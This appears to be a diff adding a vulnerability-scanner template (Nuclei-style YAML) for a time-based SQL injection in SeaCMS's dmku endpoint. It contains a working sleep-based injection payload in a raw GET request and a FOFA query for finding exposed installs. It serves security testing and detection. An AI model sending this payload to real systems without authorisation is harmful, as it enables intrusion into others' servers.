@@ -1,0 +1,28 @@
+id: seacms-dmku-sqli
+
+info:
+  name: SeaCMS DMKU - SQL Injection
+  author: leadlife
+  severity: high
+  description: SeaCMS 海洋影视管理系统 dmku 存在 SQL 注入漏洞。
+  reference:
+    - https://github.com/wy876/POC/blob/main/SeaCMS%E6%B5%B7%E6%B4%8B%E5%BD%B1%E8%A7%86%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdmku%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa_query: app="海洋CMS" || body="http://www.seacms.net"
+  tags: seacms,sqli,time
+
+http:
+  - raw:
+      - |+
+        @timeout: 15s
+        GET /js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(6)))v)&type=list HTTP/1.1
+        Host: {{Hostname}}
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+          - contains(body,'danmuku')
+        condition: and
